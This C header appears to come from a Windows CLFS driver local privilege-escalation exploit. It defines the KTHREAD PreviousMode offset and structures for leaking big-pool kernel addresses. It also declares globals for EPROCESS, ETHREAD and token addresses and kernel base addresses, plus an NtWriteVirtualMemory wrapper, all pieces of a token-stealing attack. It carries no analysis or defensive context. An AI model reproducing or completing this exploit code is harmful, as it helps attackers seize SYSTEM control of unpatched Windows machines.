#pragma once
#include <windows.h>
#include <stdio.h>
#include <clfsw32.h>
#include <ntstatus.h>
#include "ntos.h"
//#include <winternl.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Clfsw32.lib")
#define CLFS_TAG 0x73666C43 // 'CLFS'
#define KTHREAD_PREVIOUS_MODE_OFFSET 0x232
typedef struct _SYSTEM_BIGPOOL_ENTRY {
	union {
		PVOID VirtualAddress;
		ULONG_PTR NonPaged : 1;
	};
	SIZE_T SizeInBytes;
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
	};
} SYSTEM_BIGPOOL_ENTRY, * PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_BIGPOOL_INFORMATION {
	ULONG Count;
	SYSTEM_BIGPOOL_ENTRY AllocatedInfo[10000];
} SYSTEM_BIGPOOL_INFORMATION, * PSYSTEM_BIGPOOL_INFORMATION;

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS func(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);

extern _NtQuerySystemInformation fnNtQuerySystemInformation;
extern DWORD64 g_EProcessAddress;
extern DWORD64 g_EThreadAddress;
extern DWORD64 g_TokenAddress;
extern DWORD64 my_pidEprocess;
extern HANDLE hProcess;
extern DWORDLONG system_EPROCESS;

extern DWORD* hReadPipe[2];
extern UINT64 ntos_kernelBase;
extern UINT64 clfs_kernelBase;


typedef NTSTATUS(NTAPI* PNtWriteVirtualMemory)(
	HANDLE  ProcessHandle,
	PVOID   BaseAddress,
	PVOID   Buffer,
	SIZE_T  NumberOfBytesToWrite,
	PSIZE_T NumberOfBytesWritten);

extern PNtWriteVirtualMemory pNtWriteVirtualMemory;   

NTSTATUS NtWriteVirtualMemory_(     
	HANDLE  ProcessHandle,
	PVOID   BaseAddress,
	PVOID   Buffer,
	SIZE_T  NumberOfBytesToWrite,
	PSIZE_T NumberOfBytesWritten);